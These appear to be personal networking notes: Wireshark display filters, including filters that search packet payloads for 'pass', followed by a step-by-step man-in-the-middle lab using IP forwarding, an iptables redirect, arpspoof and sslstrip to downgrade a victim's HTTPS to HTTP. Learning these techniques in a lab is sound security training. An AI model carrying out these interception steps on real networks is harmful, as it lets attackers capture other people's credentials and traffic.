<details>
  <summary>Filters</summary>

    tcp.port eq 25 or icmp		=> to match 
    tcp.port in {80,443,8080}


    Looking for packet contains this words:
      - tcp.payload contains "GET"
      - tcp.payload contains "pass"


    ip.dst ne 224.1.2.3
    not ip.dst or ip.dst ne 224.1.2.3
    ip.dst and ip.dst ne 224.1.2.3
    eq => equal
    ne => not equal

    
    Packets contains ip from 192.168.0.0 to 192.168.16.16
      - ip.src==192.168.0.0/16 or ip.dst==192.158.0.0/16
  
    ip.addr == 10.43.54.65
    ip.addr != 10.43.54.65
    ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && http
    ip.src != 10.43.54.65 or ip.dst != 10.43.54.65
    ! ( ip.addr == 10.43.54.65 )
    ! (ip.src == 10.43.54.65 or ip.dst == 10.43.54.65)
    wsp.header.user_agent matches "cldc"
    ip.addr in {10.0.0.5 .. 10.0.0.9, 192.168.1.1..192.168.1.9}

    
    HTTP METHODS:
      - http contains "https://www.wireshark.org"
      - http.request.method == "POST"
      - http.request.method in {"HEAD", "GET"}
      
  
    smb || nbns || dcerpc || nbss || dns
    ftp/tcp/dns/ip

    Check for word in a response
      - resp.string==ayhaga
</details>


<details>
  <summary>MITM</summary>

    - linux tool that analyz the packets with wireshark
    - The Network adapter should be Bridged
    
      Step 1: We should set our machine in forwarding mode so that our machine has the capacity to forward each packet that was not expected for your machine.
        #  echo 1 > /proc/sys/net/ipv4/ip_forward 
      
      Step 2: Need to set iptables to redirect traffic from port 80 to port 8080 to ensure outgoing connections to sslstrip.
        #  iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 8080
      
      Step 3: Need to find our Network Gateway.
        # route -n
      
      Step 4: Next we need to find our target machine’s IP address
      
      Step 5: ARP spoofing is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network.
        # arpspoof -i -t 
      
      Step6: Now we need to listen to port 8080, by opening a new terminal window.
        # sslstrip -l 8080
      
      Step 7: Now we should go to the victim machine and for Ex type facebook.com in the browser as we know Facebook will go with HTTPS, but now check with the             victim machine, we can see the connection established through HTTP.


</details>



